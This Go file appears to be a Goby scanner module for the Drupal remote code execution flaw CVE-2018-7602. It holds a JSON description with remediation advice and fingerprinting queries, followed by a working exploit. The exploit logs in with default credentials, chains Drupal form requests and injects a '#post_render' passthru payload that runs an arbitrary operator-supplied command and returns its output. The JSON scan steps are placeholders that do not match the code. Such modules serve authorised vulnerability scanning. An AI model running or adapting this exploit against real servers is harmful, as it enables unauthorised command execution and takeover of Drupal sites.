package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Drupal RCE (CVE-2018-7602)",
    "Description": "<p>Drupal is a free and open source content management system developed in PHP language maintained by the Drupal community.</p><p>There are remote code execution vulnerabilities in the subsystems in Drupal 7.x and 8.x. A remote attacker can use this vulnerability to execute arbitrary code.</p>",
    "Product": "Drupal",
    "Homepage": "http://www.drupal.org",
    "DisclosureDate": "2021-11-24",
    "Author": "1291904552@qq.com",
    "FofaQuery": "(header=\"X-Generator: Drupal\" || body=\"content=\\\"Drupal\" || body=\"jQuery.extend(Drupal.settings\" || (body=\"/sites/default/files/\" && body=\"/sites/all/modules/\" && body=\"/sites/all/themes/\") || header=\"ace-drupal7prod\" || (banner=\"Location: /core/install.php\"))",
    "GobyQuery": "(header=\"X-Generator: Drupal\" || body=\"content=\\\"Drupal\" || body=\"jQuery.extend(Drupal.settings\" || (body=\"/sites/default/files/\" && body=\"/sites/all/modules/\" && body=\"/sites/all/themes/\") || header=\"ace-drupal7prod\" || (banner=\"Location: /core/install.php\"))",
    "Level": "2",
    "Impact": "<p>There are remote code execution vulnerabilities in the subsystems in Drupal 7.x and 8.x. A remote attacker can use this vulnerability to execute arbitrary code.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.drupal.org\">http://www.drupal.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "Drupal 管理系统后台命令执行漏洞（CVE-2018-7602）",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ],
            "Description": "<p>Drupal是Drupal社区所维护的一套用PHP语言开发的免费、开源的内容管理系统。</p><p>Drupal 7.x版本和8.x版本中的子系统后台存在远程代码执行漏洞。远程攻击者可利用该漏洞执行任意代码。</p>",
            "Impact": "<p>Drupal 7.x版本和8.x版本中的子系统存在远程代码执行漏洞。远程攻击者可利用该漏洞执行任意代码。</p>",
            "Product": "Drupal",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"http://www.drupal.org\">http://www.drupal.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "Drupal RCE (CVE-2018-7602)",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ],
            "Description": "<p>Drupal is a free and open source content management system developed in PHP language maintained by the Drupal community.</p><p>There are remote code execution vulnerabilities in the subsystems in Drupal 7.x and 8.x. A remote attacker can use this vulnerability to execute arbitrary code.</p>",
            "Impact": "<p>There are remote code execution vulnerabilities in the subsystems in Drupal 7.x and 8.x. A remote attacker can use this vulnerability to execute arbitrary code.</p>",
            "Product": "Drupal",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.drupal.org\">http://www.drupal.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "References": [
        "https://www.exploit-db.com/exploits/44557/",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-7602",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7602"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2018-7602"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": [
            "Drupal"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        "CNNVD-201804-1490"
    ],
    "CNVD": [
        "CNVD-2018-08523"
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "PocId": "10685"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri1 := "/?q=user%2Flogin"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `form_id=user_login&name=admin&pass=123456&op=Log+in`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				CookieId := regexp.MustCompile("Set-Cookie: (.*?);").FindStringSubmatch(resp1.HeaderString.String())
				uri2 := "/?q=user"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.Header.Store("Cookie", CookieId[1])
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
					userId := regexp.MustCompile("<meta about=\"(.*?)\" property=\"foaf:name\"").FindStringSubmatch(resp2.RawBody)
					uri3 := "/?q=" + userId[1] + "/cancel"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.Header.Store("Cookie", CookieId[1])
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && resp3.StatusCode == 200 {
						formToken := regexp.MustCompile("name=\"form_token\" value=\"(.*?)\" />").FindStringSubmatch(resp3.RawBody)
						uri4 := fmt.Sprintf("/?q=%s%%2Fcancel&destination=%s%%2Fcancel%%3Fq%%5B%%2523post_render%%5D%%5B%%5D%%3Dpassthru%%26q%%5B%%2523type%%5D%%3Dmarkup%%26q%%5B%%2523markup%%5D%%3D%s", userId[1], userId[1], "id")
						cfg4 := httpclient.NewPostRequestConfig(uri4)
						cfg4.VerifyTls = false
						cfg4.FollowRedirect = false
						cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg4.Header.Store("Cookie", CookieId[1])
						cfg4.Data = fmt.Sprintf("form_id=user_cancel_confirm_form&form_token=%s&_triggering_element_name=form_id&op=Cancel+account", formToken[1])
						if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil && resp4.StatusCode == 200 {
							formBuildId := regexp.MustCompile("name=\"form_build_id\" value=\"(.*?)\" />").FindStringSubmatch(resp4.RawBody)
							uri5 := "/?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F" + formBuildId[1]
							cfg5 := httpclient.NewPostRequestConfig(uri5)
							cfg5.VerifyTls = false
							cfg5.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg5.Header.Store("Cookie", CookieId[1])
							cfg5.Data = "form_build_id=" + formBuildId[1]
							if resp5, err := httpclient.DoHttpRequest(u, cfg5); err == nil {
								return resp5.StatusCode == 200 && strings.Contains(resp5.RawBody, "uid") && strings.Contains(resp5.RawBody, "gid")
							}
						}

					}
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			uri1 := "/?q=user%2Flogin"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `form_id=user_login&name=admin&pass=123456&op=Log+in`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				CookieId := regexp.MustCompile("Set-Cookie: (.*?);").FindStringSubmatch(resp1.HeaderString.String())
				uri2 := "/?q=user"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.Header.Store("Cookie", CookieId[1])
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					userId := regexp.MustCompile("<meta about=\"(.*?)\" property=\"foaf:name\"").FindStringSubmatch(resp2.RawBody)
					uri3 := "/?q=" + userId[1] + "/cancel"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.Header.Store("Cookie", CookieId[1])
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
						formToken := regexp.MustCompile("name=\"form_token\" value=\"(.*?)\" />").FindStringSubmatch(resp3.RawBody)
						uri4 := fmt.Sprintf("/?q=%s%%2Fcancel&destination=%s%%2Fcancel%%3Fq%%5B%%2523post_render%%5D%%5B%%5D%%3Dpassthru%%26q%%5B%%2523type%%5D%%3Dmarkup%%26q%%5B%%2523markup%%5D%%3D%s", userId[1], userId[1], cmd)
						cfg4 := httpclient.NewPostRequestConfig(uri4)
						cfg4.VerifyTls = false
						cfg4.FollowRedirect = false
						cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						cfg4.Header.Store("Cookie", CookieId[1])
						cfg4.Data = fmt.Sprintf("form_id=user_cancel_confirm_form&form_token=%s&_triggering_element_name=form_id&op=Cancel+account", formToken[1])
						if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil && resp4.StatusCode == 200 {
							formBuildId := regexp.MustCompile("name=\"form_build_id\" value=\"(.*?)\" />").FindStringSubmatch(resp4.RawBody)
							uri5 := "/?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F" + formBuildId[1]
							cfg5 := httpclient.NewPostRequestConfig(uri5)
							cfg5.VerifyTls = false
							cfg5.Header.Store("Content-Type", "application/x-www-form-urlencoded")
							cfg5.Header.Store("Cookie", CookieId[1])
							cfg5.Data = "form_build_id=" + formBuildId[1]
							if resp5, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg5); err == nil && resp5.StatusCode == 200 {
								body := regexp.MustCompile("((\\S|\\s)*?)\\[{\"command\":\"settings\",").FindStringSubmatch(resp5.RawBody)
								expResult.Output = body[1]
								expResult.Success = true
							}
						}

					}
				}

			}
			return expResult
		},
	))
}

//vulfocus success
